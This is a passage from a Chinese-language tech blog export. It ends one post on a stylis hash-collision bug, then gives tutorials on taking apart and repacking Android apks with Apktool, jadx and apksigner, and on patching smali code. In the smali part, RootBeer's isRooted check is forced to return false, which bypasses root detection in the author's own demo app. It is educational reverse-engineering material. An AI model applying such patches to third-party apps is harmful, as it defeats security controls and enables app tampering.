: out &#125; // color/column, c, o, l case 963: &#123; // column, n return out.charCodeAt(5) === 110 ? webkit + out + out : out &#125; // box-decoration-break, b, o, x case 1009: &#123; if (out.charCodeAt(4) !== 100) &#123; break &#125; &#125; // mask, m, a, s // clip-path, c, l, i case 969: case 942: &#123; return webkit + out + out &#125; // appearance: a, p, p case 978: &#123; return webkit + out + moz + out + out &#125; &#125; &#125; 看起來對於每個 prefix 都會加上註解，於是我就搜尋了一下 letter-spacing，發現一無所獲，事情就變得有趣了起來，看來 letter-spacing 有 vendor prefix 這個行為好像不是預期的。 再來我們看一下它加上 prefix 的方式，是先把屬性經過一個自定義的 hash：var hash = (first*2) + (second*3) + (third*4) 之後，判斷 hash 出來的結果，再根據結果來加上 prefix。 那我們試著把 letter-spacing 來做 hash 好了： function hash(str) &#123; return str.charCodeAt(0) * 2 + str.charCodeAt(1) * 3 + str.charCodeAt(2) * 4 &#125; console.log(hash('letter-spacing')) // 983 接著在 source code 裡面搜尋 983： 謎底揭曉！ 原來是一個因為 hash collision 所引起的 bug！之前聽過很多建議說 hash function 最好不要自己定義，沒想到真的讓我看到一個現實世界中，用自定義 hash function 結果碰撞的案例。 user-select 這個字串經過 hash 以後也是 983，跟 letter-spacing 一樣。因此在轉換 letter-spacing 的時候就會跑到這個 case 裡面，幫 letter-spacing 也加上 vendor prefix。 所以在這邊也修正一下標題，其實不是 styled components 的 bug，而是 stylis 的 bug，但是 styled components 跟 emotion 都用到了 stylis，所以也都有這個 bug。 後續處理我在 styled, emotion 跟 styled components 的 repo 都搜過一輪，發現好像沒有人注意到這個 issue，不過有發現到的是 emotion 有一個把 stylis 更新到 v4 的 PR：Stylis v4 #1817，而且在近期已經 merge 進去了，所以下一版的 emotion（應該是大版本號的更新，因為是 breaking change）就沒有這問題了。 而 stylis 那邊我也發了一個 issue 告知他們這件事：Redundant css vendor prefix for letter-spacing in v3 #223，不過看起來他們那邊也沒什麼能做的，而且這是存在於舊版的 bug，在新版已經沒有了，所以也不會在舊版修掉。 最後是 styled components 那邊，我一樣發了一個 issue 講這件事：Redundant css vendor prefix for letter-spacing #3157，但目前還沒人理我就是了。 同時也發了一個改文件網址的 PR：Update stylis plugin docs url #3156，避免有其他人跟我一樣找不到 plugin 的文件。 總結其實從這件事情上面學到滿多的。 第一點是發現了一個有趣的 bug，一個因為 hash collision 所引起的 bug。 第二點是我原本以為移除掉那 500 多個 prefix 以後，可以降低一點檔案大小，沒想到實際衡量過後，才減少 1KB 而已。很多時候我都忘記把 gzip 這個因素考慮進去，在這次之後就不會忘掉它了。 第三點是我發現我好像對於 bug 有一種「一定要修好」的心態，但在現實世界中並不會這麼理想，畢竟做事情有優先順序。 雖然說 letter-spacing 加上 prefix 的確是一件冗余的事，但是影響範圍是什麼？就是增加了一點微不足道的檔案大小，還有看起來比較奇怪而已。說實在的，並不是什麼嚴重的 bug，就算不修好像也沒有太大的影響，網頁也不會因此而跑版，所以其實是一個很無害的 bug。 所以也藉由這個事件，重新整理了一次自己面對 bug 時應該要有的心態。 這篇到這邊就差不多啦，如果你家的網站也有在用 emotion 或是 styled components，不如去看一下是不是也有這個 letter-spacing 的問題吧！","link":"/2020/07/11/an-interesting-styled-components-bug/"},{"title":"Android App 逆向入門之一：拆開與重組 apk","text":"五年前我有寫過一篇：[Android] 人人都會的 apk 反編譯，那時我還是個寫 Android 的工程師，因為工作上的需求跟同事一起研究了基本的 Android 逆向工程，想達成的目標是全自動的流程，上傳一個 apk 以後自動把 apk 拆開來，塞一些奇怪的東西再裝回去。 而現在同樣是因為工作上的需求，再次回憶並補強了一下對於 apk 反編譯以及修改等等的相關知識，寫成這一系列的文章跟大家分享。 先說在前面，這一系列都只是「入門」而已，利用各種工具把 apk 拆開來再裝回去，對於沒有加殼的 app 應該夠用了，但如果有加殼過的話，需要再更深一點的 binary 相關知識才能夠解開，那又是另一個世界了。 總之呢，這個系列適合沒有接觸過 Android App 逆向，想要玩玩看的人，也適合 Android 工程師，可以把自己寫的 app 拆開來，看看是什麼樣子，我覺得也滿有用的。 系列文連結： Android App 逆向入門之一：拆開與重組 apk Android App 逆向入門之二：修改 smali 程式碼 Android App 逆向入門之三：監聽 app 封包 Android App 逆向入門之四：使用 Frida 進行動態分析 要逆向，先從正向了解 Android app 開始我認為想要逆向 Android app 的話，先大致了解一下 app 到底是怎麼寫出來的會滿有幫助的，至少在把 app 拆開來以後可以快速地知道各個部分大概在幹嘛。 所以我很推薦大家隨便找個 Android app 的教學，跟著教學把 Android Studio 裝起來，然後寫一個非常簡單的 app 並且跑起來，甚至打包成 apk 檔案，都會加強對於整個流程的理解。 接下來我就帶大家簡單看看一個 app 是怎麼寫成的。 首先呢，一個 app 大概是由三個元件所組成的： AndroidManifest.xml，可以想成是 app 的設定檔，寫著各種 app 相關資訊 resources，各種資源，包括排版、程式中出現的字串、圖片等等所有資訊 程式碼 底下是一個簡單的專案截圖，左邊是檔案結構，右邊是 AndroidManifest.xml 的內容： 為了怕圖片不太清楚，底下是 xml 的內容： &lt;?xml version=\"1.0\" encoding=\"utf-8\"?> &lt;manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" package=\"com.example.myapplication\"> &lt;application android:allowBackup=\"true\" android:icon=\"@mipmap/ic_launcher\" android:label=\"@string/app_name\" android:roundIcon=\"@mipmap/ic_launcher_round\" android:supportsRtl=\"true\" android:theme=\"@style/AppTheme\"> &lt;activity android:name=\".MainActivity\" android:label=\"@string/app_name\" android:theme=\"@style/AppTheme.NoActionBar\"> &lt;intent-filter> &lt;action android:name=\"android.intent.action.MAIN\" /> &lt;category android:name=\"android.intent.category.LAUNCHER\" /> &lt;/intent-filter> &lt;/activity> &lt;/application> &lt;/manifest> 從這個檔案中我們可以知道幾件事情，包括： 這個 app 的 package name 是 com.example.myapplication 這個 app 有一個 activity，名稱是 MainActivity，是主要的 activity 每一個 app 都會有一個 unique 的 package name，可以想成就是這個 app 的 id，會寫在 AndroidManifest 裡面，而這也會跟你程式碼的檔案結構有關，有寫過 Java 的都會知道。 如果你去網頁版的 Google Play，就會發現網址上寫著的就是 package name，舉例來說 Facebook 的頁面網址長這樣：https://play.google.com/store/apps/details?id=com.facebook.katana&amp;hl=zh_TW&amp;gl=US 因此 com.facebook.katana 就是 Facebook app 的 package name。 再來我們看第二點，什麼又是 activity 呢？ 你可以把 activity 想成是一個「畫面」，每一個畫面就是一個 activity，所以假設現在是個需要註冊才能使用的 app，很可能會有底下這些畫面： 歡迎頁面 註冊頁面 登入頁面 主頁面（登入成功後顯示） 而這每一個頁面都是一個 activity，而每一個 activity 可能都有一個 layout，在 Android 開發中，layout 其實就是一個 xml 檔案，會像是這樣： 右邊是你看到的樣子，左邊則是 layout 的 xml 檔案，這就有點像是網頁前端中畫面跟 HTML+CSS 的關係一樣，只是在 Android 開發中是用 xml 來產生畫面，而不是用 HTML+CSS。 像 layout 就屬於資源的一種，會被放在 res 資料夾裡面。 而上面的 layout 檔案，還有兩個值得注意的地方。 第一個是 android:id=&quot;@+id/textview_first&quot;，代表這個 component 對應到一個 id，為什麼要對應到 id 呢？因為這樣我們才能在程式碼裡面存取到這個 component，像這樣： TextView tv = (TextView) findViewById(R.id.textview_first); tv.setText(\"hello\"); 我們要先利用 id 找到這個 component，才能改變它的文字。 第二個值得注意的地方是 android:text=&quot;@string/hello_first_fragment&quot;，這其實就是元件會顯示的文字，假設我寫：android:text=&quot;hello&quot;，畫面上就會顯示 hello。 那為什麼上面的內容是 @string/hello_first_fragment 呢？我們可以去看看 res/values/strings.xml 這個檔案： 內容為： &lt;resources> &lt;string name=\"app_name\">My Application&lt;/string> &lt;string name=\"action_settings\">Settings&lt;/string> &lt;!-- Strings used for fragments for navigation --> &lt;string name=\"first_fragment_label\">First Fragment&lt;/string> &lt;string name=\"second_fragment_label\">Second Fragment&lt;/string> &lt;string name=\"next\">Next&lt;/string> &lt;string name=\"previous\">Previous&lt;/string> &lt;string name=\"hello_first_fragment\">Hello first fragment&lt;/string> &lt;string name=\"hello_second_fragment\">Hello second fragment. Arg: %1$s&lt;/string> &lt;/resources> 可以看到裡面有個 name 為 hello_first_fragment 的 string，內容是 Hello first fragment。 利用這樣的方法，我們可以避免直接在 layout 裡面 hard code 字串，避免將字串寫死。為什麼要避免寫死呢？因為要做多國語系！ 如果你想要做成英文版的，那其實你可以建立一個新檔案叫做 res/values/strings-en.xml 之類的，Android 偵測到作業系統是英文時，就會自動去抓這個檔案裡面的字串來用，如此一來，你就只需要改變這個字串檔就好，不需要動到程式碼。 以上就是一些 Android app 的基本介紹，包括： AndroidManifest 是做什麼的？ 什麼是 activity？ 各種 xml 檔案的用途是什麼？ 理解這些以後，我們就可以來拆 apk 了。 我寫了一個簡單的範例 app，連結在這：https://github.com/aszx87410/demo/raw/master/android/demoapp.apk 跑起來以後長這樣，小巧可愛： 按下 Check root 之後會檢查裝置是否有 root，並改變畫面上的文字。 簡易 apk 拆解其實 apk 就是一個壓縮檔，所以我們可以直接用內建的指令把 apk 拆開： unzip demoapp.apk -d demoapp 拆開來會長這樣： 大致上有底下幾個資料夾跟檔案： lib - 拿來放 native 程式碼用的，以後會講到 META-INF - 會有一些簽章相關資訊 res - 剛剛寫 app 的時候有看到了 AndroidManifest.xml - 同上 classes.dex - 程式碼編譯成 dex 後的結果 resources.arsc - resource 相關的索引表 先來講一下 resources.arsc 是幹嘛的，如果你打開 res 資料夾底下的任一檔案時，你會發現檔案內容不是純文字，而是一堆 16 進位的東西，像這樣： 0300 0800 8401 0000 0100 1c00 a800 0000 0700 0000 0000 0000 0001 0000 3800 0000 0000 0000 0000 0000 0f00 0000 1a00 0000 2600 0000 3000 0000 3800 0000 4200 0000 0c0c 696e 7465 7270 6f6c 6174 6f72 0008 0864 7572 6174 696f 6e00 0909 6672 6f6d 416c 7068 6100 0707 746f 416c 7068 6100 0505 616c 7068 6100 0707 616e 6472 6f69 6400 2a2a 6874 7470 3a2f 2f73 6368 656d 這是因為這些 xml 已經被編譯過了，需要搭配 resources.arsc 才能還原成文字的形式。 而 classes.dex 也是經過編譯的東西，需要再進一步反編譯之後才能看到裡面的內容。 從上面這些我們可以知道，雖然可以手動利用解壓縮的方式把 apk 拆開，但其實看不到什麼有用的內容。為了進一步看到其中的內容，我們需要其他工具來做這件事情。 利用 Apktool 拆解 apk剛剛使用的 unzip 只是單純將壓縮檔解開，而 Apktool 的網站上開宗明義就寫了：A tool for reverse engineering Android apk files，表明了它就是拿來拆 apk 用的。 有關於下載跟安裝的細節我就不寫了，可自行參考官網：https://ibotpeaches.github.io/Apktool/ 或者是其他網路上的資源。 接著，我們就來用 Apktool 拆開剛剛的 demoapp： # d 是 decode 的意思 # -f 是 --force，代表如果有 demoapp 的資料夾就先刪掉 apktool d -f demoapp 拆開來以後可以看到底下的檔案結構： . ├── AndroidManifest.xml ├── apktool.yml ├── lib ├── original ├── res └── smali 跟我們用壓縮檔解開的差別在於沒有了 resources.arsc，也沒有了classes.dex，前者是因為已經將資源還原成文字檔，後者則是還原成了 smali 資料夾底下的檔案，這個下一篇會提到。 接著我們先來改改看畫面上的文字。 打開 res/values/strings.xml，搜尋：Hello first fragment，會找到這一段： &lt;string name=\"hello_first_fragment\">Hello first fragment&lt;/string> 我們直接將內容改掉，改成： &lt;string name=\"hello_first_fragment\">Hacked!&lt;/string> 接下來只要將 apk 重新打包並裝回去，應該就能看到改過的文字。 重新打包 apkApktool 除了拿來拆解 apk 以外，也可以將 apk 重新組裝回去，指令如下： apktool b demoapp -o demoapp2.apk 如果在打包的時候有出錯，可以改用： apktool b --use-aapt2 demoapp -o demoapp2.apk 沒意外的話，就會在資料夾底下看到一個 demoapp2.apk 的檔案，但這時如果你直接安裝這個檔案會出錯： adb: failed to install demoapp2.apk: Failure [INSTALL_PARSE_FAILED_NO_CERTIFICATES: Failed to collect certificates from /data/app/vmdl1575742168.tmp/base.apk: Attempt to get length of null array] 這是因為 apk 檔打包出來以後還要經過兩道手續：align 跟 sign，才能安裝到手機上面。 align 是為了效能上的考量，而 sign 則是為了安全性。 在 Google Play 後台上傳新的 apk 時，Google 會檢查 apk 簽署時用的簽章是否跟之前一樣，如果不一樣的話會不讓你上傳。如此一來，就算攻擊者拿到受害者的帳號，也沒辦法上傳新的 apk，因為簽章不符。 我們先來產生一個新的簽章： keytool -genkey -v -keystore my-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-alias 問你 password 的地方輸入 123456 即可，其他都可以不填，執行完畢以後就會看到一個 my-release-key.jks 的檔案。 接著我有寫了一個簡單的 script，自動移除舊版本 + build + align + sign + install： # compile.sh # 移除舊的 app adb uninstall com.cymetrics.demo # 刪除舊的 apk rm -f demoapp2.apk rm -f demoapp2-final.apk rm -f demoapp2-aligned.apk # build apktool b --use-aapt2 demoapp -o demoapp2.apk # align zipalign -v -p 4 demoapp2.apk demoapp2-aligned.apk # sign apksigner sign --ks my-release-key.jks --ks-pass pass:123456 --out demoapp2-final.apk demoapp2-aligned.apk adb install demoapp2-final.apk 跑完 script 以後打開 app，沒意外的話你就會看見字已經被我們改掉了： 沒錯，修改一個單純的 app 就是這麼簡單。 總結在這篇文章中我們學習了一些 Android 開發的基礎，也利用了 Apktool 將 apk 拆開，看見裡面的 resources 檔案，並且將其改造過後重新包回 apk 檔，安裝到手機上，做出了一個修改版的 app。 如果只是要改文字這些資源的話，就是這麼容易，但如果要改程式碼的話就相對麻煩許多。 在下一篇中，我們會來學習如何把 smali 還原成 Java code，以及如何修改 smali 程式碼。 系列文連結： Android App 逆向入門之一：拆開與重組 apk - 你在這篇 Android App 逆向入門之二：修改 smali 程式碼 Android App 逆向入門之三：監聽 app 封包 Android App 逆向入門之四：使用 Frida 進行動態分析","link":"/2023/04/27/android-apk-decompile-intro-1/"},{"title":"Android App 逆向入門之二：修改 smali 程式碼","text":"在第一篇當中我們學到了基礎中的基礎，靠著 Apktool 把 apk 拆開，修改資源以後組裝回去，並且把對齊且簽署過的 apk 裝回手機上面。 而接下來的這一篇，我們要來看看如何修改程式碼。 我們的目的是在一台有 root 的手機上繞過檢查，讓 app 顯示沒有 root。如果你是用沒有 root 的手機來測試的話，你可以反過來，將 app 改成會偵測出你有 root。 系列文連結： Android App 逆向入門之一：拆開與重組 apk Android App 逆向入門之二：修改 smali 程式碼 Android App 逆向入門之三：監聽 app 封包 Android App 逆向入門之四：使用 Frida 進行動態分析 什麼是 Smali在我們利用 apktool d 拆開的內容中，有一個資料夾叫做 smali，裡面存放著的就是從 classes.dex 還原出來的東西，也就是程式碼。但這些程式碼跟你想的可能不太一樣，例如說我們可以來看看 smali/com/cymetrics/demo/MainActivity.smali： .class public Lcom/cymetrics/demo/MainActivity; .super Landroidx/appcompat/app/AppCompatActivity; .source \"MainActivity.java\" # direct methods .method public constructor &lt;init>()V .locals 0 .line 16 invoke-direct &#123;p0&#125;, Landroidx/appcompat/app/AppCompatActivity;->&lt;init>()V return-void .end method # virtual methods .method protected onCreate(Landroid/os/Bundle;)V .locals 1 .line 20 invoke-super &#123;p0, p1&#125;, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V const p1, 0x7f0b001c .line 21 invoke-virtual &#123;p0, p1&#125;, Lcom/cymetrics/demo/MainActivity;->setContentView(I)V const p1, 0x7f080122 .line 22 invoke-virtual &#123;p0, p1&#125;, Lcom/cymetrics/demo/MainActivity;->findViewById(I)Landroid/view/View; move-result-object p1 check-cast p1, Landroidx/appcompat/widget/Toolbar; .line 23 invoke-virtual &#123;p0, p1&#125;, Lcom/cymetrics/demo/MainActivity;->setSupportActionBar(Landroidx/appcompat/widget/Toolbar;)V const p1, 0x7f08007a .line 25 invoke-virtual &#123;p0, p1&#125;, Lcom/cymetrics/demo/MainActivity;->findViewById(I)Landroid/view/View; move-result-object p1 check-cast p1, Lcom/google/android/material/floatingactionbutton/FloatingActionButton; .line 26 new-instance v0, Lcom/cymetrics/demo/MainActivity$1; invoke-direct &#123;v0, p0&#125;, Lcom/cymetrics/demo/MainActivity$1;->&lt;init>(Lcom/cymetrics/demo/MainActivity;)V invoke-virtual &#123;p1, v0&#125;, Lcom/google/android/material/floatingactionbutton/FloatingActionButton;->setOnClickListener(Landroid/view/View$OnClickListener;)V return-void .end method .method public onCreateOptionsMenu(Landroid/view/Menu;)Z .locals 2 .line 38 invoke-virtual &#123;p0&#125;, Lcom/cymetrics/demo/MainActivity;->getMenuInflater()Landroid/view/MenuInflater; move-result-object v0 const/high16 v1, 0x7f0c0000 invoke-virtual &#123;v0, v1, p1&#125;, Landroid/view/MenuInflater;->inflate(ILandroid/view/Menu;)V const/4 p1, 0x1 return p1 .end method .method public onOptionsItemSelected(Landroid/view/MenuItem;)Z .locals 2 .line 47 invoke-interface &#123;p1&#125;, Landroid/view/MenuItem;->getItemId()I move-result v0 const v1, 0x7f08003f if-ne v0, v1, :cond_0 const/4 p1, 0x1 return p1 .line 54 :cond_0 invoke-super &#123;p0, p1&#125;, Landroidx/appcompat/app/AppCompatActivity;->onOptionsItemSelected(Landroid/view/MenuItem;)Z move-result p1 return p1 .end method 如果你覺得看起來不是很好閱讀，那是正常的。 Smali 是跑在 Android Dalvik VM 上的 byte code，有著自己的一套語法規則，如果想要看到我們熟悉的 Java 程式碼，必須要將 smali 還原成 Java。 利用 jadx 還原出 Java 程式碼接著我們要用到另外一套工具：jadx，GitHub 上面它對自己的描述是：Dex to Java decompiler。 安裝過程我一樣省略，接著我們用 jadx 把 apk 拆開： # -r 代表不要把 resource 拆開，因為我們只關注程式碼 # -d 代表目的地 jadx -r demoapp.apk -d jadx-demoapp 跑完以後就會看到多了一個 jadx-demoapp 的資料夾，我們點進去裡面的 sources/com/cymetrics/demo/MainActivity.java，可以看到如下內容： package com.cymetrics.demo; import android.os.Bundle; import android.view.Menu; import android.view.MenuItem; import android.view.View; import androidx.appcompat.app.AppCompatActivity; import androidx.appcompat.widget.Toolbar; import com.google.android.material.floatingactionbutton.FloatingActionButton; import com.google.android.material.snackbar.Snackbar; /* loaded from: classes.dex */ public class MainActivity extends AppCompatActivity &#123; /* JADX INFO: Access modifiers changed from: protected */ @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity public void onCreate(Bundle bundle) &#123; super.onCreate(bundle); setContentView(R.layout.activity_main); setSupportActionBar((Toolbar) findViewById(R.id.toolbar)); ((FloatingActionButton) findViewById(R.id.fab)).setOnClickListener(new View.OnClickListener() &#123; // from class: com.cymetrics.demo.MainActivity.1 @Override // android.view.View.OnClickListener public void onClick(View view) &#123; Snackbar.make(view, \"Replace with your own action\", 0).setAction(\"Action\", (View.OnClickListener) null).show(); &#125; &#125;); &#125; @Override // android.app.Activity public boolean onCreateOptionsMenu(Menu menu) &#123; getMenuInflater().inflate(R.menu.menu_main, menu); return true; &#125; @Override // android.app.Activity public boolean onOptionsItemSelected(MenuItem menuItem) &#123; if (menuItem.getItemId() == R.id.action_settings) &#123; return true; &#125; return super.onOptionsItemSelected(menuItem); &#125; &#125; 這才是我們想看到的內容嘛！因為這個 apk 沒有經過混淆，所以幾乎可以看到完整的 java 檔案，跟原始碼差不了多少。 簡單講一下混淆（Obfuscation），混淆就是把程式碼打亂，讓人不容易看出來原本的程式碼是什麼，例如說把變數名字都換成 aa, bb, cc, dd 這種沒有意義的名稱之類的，就是最基本的混淆。在 Android 開發中通常透過 ProGuard 這個工具來做混淆。 像上面那樣的程式碼很明顯就沒有混淆過，讓人很容易就能看出原本的邏輯。 這次我們要來改動的程式碼在 com/cymetrics/demo/FirstFragment.java： package com.cymetrics.demo; import android.os.Bundle; import android.view.LayoutInflater; import android.view.View; import android.view.ViewGroup; import android.widget.TextView; import androidx.fragment.app.Fragment; import com.scottyab.rootbeer.RootBeer; /* loaded from: classes.dex */ public class FirstFragment extends Fragment &#123; @Override // androidx.fragment.app.Fragment public View onCreateView(LayoutInflater layoutInflater, ViewGroup viewGroup, Bundle bundle) &#123; return layoutInflater.inflate(R.layout.fragment_first, viewGroup, false); &#125; @Override // androidx.fragment.app.Fragment public void onViewCreated(View view, Bundle bundle) &#123; super.onViewCreated(view, bundle); view.findViewById(R.id.button_first).setOnClickListener(new View.OnClickListener() &#123; // from class: com.cymetrics.demo.FirstFragment.1 @Override // android.view.View.OnClickListener public void onClick(View view2) &#123; TextView textView = (TextView) view2.getRootView().findViewById(R.id.textview_first); if (new RootBeer(view2.getContext()).isRooted()) &#123; textView.setText(\"Rooted!\"); &#125; else &#123; textView.setText(\"Safe, not rooted\"); &#125; &#125; &#125;); &#125; &#125; 主要的邏輯是這一段： public void onClick(View view2) &#123; TextView textView = (TextView) view2.getRootView().findViewById(R.id.textview_first); if (new RootBeer(view2.getContext()).isRooted()) &#123; textView.setText(\"Rooted!\"); &#125; else &#123; textView.setText(\"Safe, not rooted\"); &#125; &#125; 這一段會去呼叫一個第三方的 library 檢查是否有 root，有的話就顯示 Rooted!，沒有的話就顯示 Safe, not rooted。 在研究程式碼邏輯時，我們可以看著 java 程式碼，但如果要改 code 的話，就不是改 java code 這麼簡單了，我們必須要直接去改 smali 的 code，才能把 app 重新打包回去。 修改 smali 程式碼還記得我們用 Apktool 解開的資料夾嗎？smali 程式碼就在那裡面，路徑是：smali/com/cymetrics/demo/FirstFragment$1.smali，仔細找一下內容，就可以找到 onClick 的程式碼： # virtual methods .method public onClick(Landroid/view/View;)V .locals 2 .line 32 invoke-virtual &#123;p1&#125;, Landroid/view/View;->getRootView()Landroid/view/View; move-result-object v0 const v1, 0x7f08011c invoke-virtual &#123;v0, v1&#125;, Landroid/view/View;->findViewById(I)Landroid/view/View; move-result-object v0 check-cast v0, Landroid/widget/TextView; .line 34 new-instance v1, Lcom/scottyab/rootbeer/RootBeer; invoke-virtual &#123;p1&#125;, Landroid/view/View;->getContext()Landroid/content/Context; move-result-object p1 invoke-direct &#123;v1, p1&#125;, Lcom/scottyab/rootbeer/RootBeer;->&lt;init>(Landroid/content/Context;)V .line 35 invoke-virtual &#123;v1&#125;, Lcom/scottyab/rootbeer/RootBeer;->isRooted()Z move-result p1 if-eqz p1, :cond_0 const-string p1, \"Rooted!\" .line 36 invoke-virtual &#123;v0, p1&#125;, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V goto :goto_0 :cond_0 const-string p1, \"Safe, not rooted\" .line 38 invoke-virtual &#123;v0, p1&#125;, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V :goto_0 return-void .end method 簡單講解一下一些基礎的 smali 語法，.method public onClick(Landroid/view/View;)V 就是說有一個 public 的 method 叫做 onClick，接收一個參數類型是 android/view/View，括號最後面的 V 則代表 void，沒有回傳值。 .locals 2 指的是這個 function 會用到兩個暫存器，也就是 v0 跟 v1，如果你用到 v2 的話就會出錯，因此如果需要更多暫存器，記得要改這邊。 參數的話會用 p 來表示，通常 p0 代表 this，p1 就是第一個參數，因此 invoke-virtual &#123;p1&#125;, Landroid/view/View;-&gt;getRootView()Landroid/view/View; 就是把第一個參數丟進去呼叫 getRootView() 這個 method。 而這整段裡面，核心的程式碼是這一段： .line 35 invoke-virtual &#123;v1&#125;, Lcom/scottyab/rootbeer/RootBeer;->isRooted()Z move-result p1 if-eqz p1, :cond_0 const-string p1, \"Rooted!\" .line 36 invoke-virtual &#123;v0, p1&#125;, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V goto :goto_0 :cond_0 const-string p1, \"Safe, not rooted\" if-eqz p1, :cond_0 指的就是如果 p1 是 0，就跳到 :cond_0 的地方，而 p1 是 RootBeer-&gt;isRooted() 的回傳值。也就是說，p1 代表著 root 檢查的結果，只要能把 p1 改掉，就能偽造不同的結果。 這邊有很多種改法，例如說把原本的 if-eqz 改成 if-nez，就可以反轉邏輯，或我們可以直接將 p1 硬改成 0，順便加上 log 確認我們有執行到這裡： .line 35 invoke-virtual &#123;v1&#125;, Lcom/scottyab/rootbeer/RootBeer;->isRooted()Z move-result p1 # 加上 log，印出 \"we are here\" const-string v1, \"we are here\" invoke-static &#123;v1, v1&#125;, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I # 將 p1 直接硬改成 0 const/4 p1, 0x0 if-eqz p1, :cond_0 const-string p1, \"Rooted!\" .line 36 invoke-virtual &#123;v0, p1&#125;, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V goto :goto_0 :cond_0 const-string p1, \"Safe, not rooted\" 加上那三行以後存檔，接著照著上一篇講的重新打包，安裝在手機上，打開 app 以後先看 log。 要看 Android 的 log 的話，需要用 adb logcat 這個指令來看，但如果你直接輸入這個指令，會噴一堆 log 出來，在這邊教大家兩個好用的指令。 第一個是 adb logcat -c，可以清掉之前的 log，第二個是： adb logcat --pid=`adb shell pidof -s com.cymetrics.demo` 可以看到指定 package name 的 log，排除其他雜訊，這個真的很好用。 準備就緒以後，按下 app 內的 CHECK ROOT 按鈕，就會看到一條新的 log： 01-25 09:32:06.528 27651 27651 E we are here: we are here 以及畫面上出現的 Safe, not rooted 的字樣，就大功告成了。 更改其他地方的程式碼剛剛我們改動了 fragment 中的程式碼，也就是程式的邏輯，把 isRooted() 的回傳值取代掉，讓它永遠是 false，繞過了檢查。 但如果程式中還有其他地方也會做類似的檢查那就麻煩了，因為我們必須找出每一個做檢查的地方，然後都做類似的事情，把每一處都改掉。 因此，一個比較有效率的方法是直接去改動這個第三方 library 的程式碼，讓 isRooted 永遠都回傳 false，這樣就算 app 在多個地方都有檢查，也會一起被繞過。 呼叫 function 時的程式碼是 Lcom/scottyab/rootbeer/RootBeer;-&gt;isRooted()，因此我們可以順藤摸瓜找到這個檔案：com/scottyab/rootbeer/RootBeer.smali，搜尋 isRooted 就會找到程式碼： .method public isRooted()Z .locals 1 .line 44 invoke-virtual &#123;p0&#125;, Lcom/scottyab/rootbeer/RootBeer;->detectRootManagementApps()Z move-result v0 if-nez v0, :cond_1 invoke-virtual &#123;p0&#125;, Lcom/scottyab/rootbeer/RootBeer;->detectPotentiallyDangerousApps()Z move-result v0 if-nez v0, :cond_1 const-string v0, \"su\" invoke-virtual &#123;p0, v0&#125;, Lcom/scottyab/rootbeer/RootBeer;->checkForBinary(Ljava/lang/String;)Z move-result v0 if-nez v0, :cond_1 .line 45 invoke-virtual &#123;p0&#125;, Lcom/scottyab/rootbeer/RootBeer;->checkForDangerousProps()Z move-result v0 if-nez v0, :cond_1 invoke-virtual &#123;p0&#125;, Lcom/scottyab/rootbeer/RootBeer;->checkForRWPaths()Z move-result v0 if-nez v0, :cond_1 .line 46 invoke-virtual &#123;p0&#125;, Lcom/scottyab/rootbeer/RootBeer;->detectTestKeys()Z move-result v0 if-nez v0, :cond_1 invoke-virtual &#123;p0&#125;, Lcom/scottyab/rootbeer/RootBeer;->checkSuExists()Z move-result v0 if-nez v0, :cond_1 invoke-virtual &#123;p0&#125;, Lcom/scottyab/rootbeer/RootBeer;->checkForRootNative()Z move-result v0 if-nez v0, :cond_1 invoke-virtual &#123;p0&#125;, Lcom/scottyab/rootbeer/RootBeer;->checkForMagiskBinary()Z move-result v0 if-eqz v0, :cond_0 goto :goto_0 :cond_0 const/4 v0, 0x0 goto :goto_1 :cond_1 :goto_0 const/4 v0, 0x1 :goto_1 return v0 .end method 想要 patch 這個函式非常簡單，我們讓它永遠都回傳 false 就好： .method public isRooted()Z .locals 1 # 在開頭新增底下這兩行，永遠回傳 false const/4 v0, 0x0 return v0 # 以下省略... .end method 接著一樣重新打包之後安裝在手機上，就能看到繞過的成果。 總結在這篇裡面我們學到了如何閱讀基本的 smali 程式碼以及修改它，也學到了該如何利用 adb logcat 來看 Android app 的 log，並且實際下去修改 smali，反轉原本的邏輯，去繞過 app 對於 root 的檢查。 加上 log 是一個我覺得雖然看起來好像很笨很沒效率，但其實很有用的方法，就跟寫程式出錯的時候我會加一大堆 console.log 一樣，透過 log 來確認程式的執行流程跟自己預期中的相符，對於還原邏輯很有幫助。 最後，這篇我只有稍微提了一下 smali，如果想更了解 smali 的語法，可以參考底下文章： Android逆向基础：Smali语法 APK反编译之一：基础知识–smali文件阅读 在下一篇文章中，我會介紹如何去監聽 app 向外發送的 request 以及 response，幫助我們了解 app 跟 API server 的溝通。 系列文連結： Android App 逆向入門之一：拆開與重組 apk Android App 逆向入門之二：修改 smali 程式碼 - 你在這篇 Android App 逆向入門之三：監聽 app 封包 Android App 逆向入門之四：使用 Frida 進行動態分析","link":"/2023/04/27/android-apk-decompile-intro-2/"},{"title":"Android App 逆向入門之三：監聽 app 封包","text":"我記得在我剛接觸 Android 沒多久的時候，要看 app 到底發了哪些 request 是很簡單的一件事情。只要在電腦上面裝個 Charles，接著設定手機上的 Wifi，讓它 proxy 到電腦上，然後輸入特定網址下載 Charles 提供的憑證，安裝完成以後就搞定了。 但前陣子用了一樣的流程，雖然有聽到一些封包，但從 app 出來的流量卻是空的，上網找了各式各樣的解法之後都行不通。 最後我才知道，原來是 Android 在 6.0 以上改變了安全性的設定，預設就不相信使用者自行安裝的憑證，所以才會攔截不到。有種做法是裝個 local VPN，這樣流量就會全部都過 proxy，但我試過以後發現還是有點麻煩。 在眾多方法之中，我試過最有用的方法，就是把 apk 拆開，改一些設定之後再裝回去，這篇就來記錄一下流程跟心得。 系列文連結： Android App 逆向入門之一：拆開與重組 apk Android App 逆向入門之二：修改 smali 程式碼 Android App 逆向入門之三：監聽 app 封包 Android App 逆向入門之四：使用 Frida 進行動態分析 前置作業前置作業一共有兩項： 準備 proxy 設置手機 Proxy 的部分其實任選一套都可以，我是用常見的 Burp Suite，其他軟體的設置應該也都大同小異。 首先，先到 Proxy -&gt; Options 裡面新增 Proxy Listeners，bind to address 的部分記得選 all 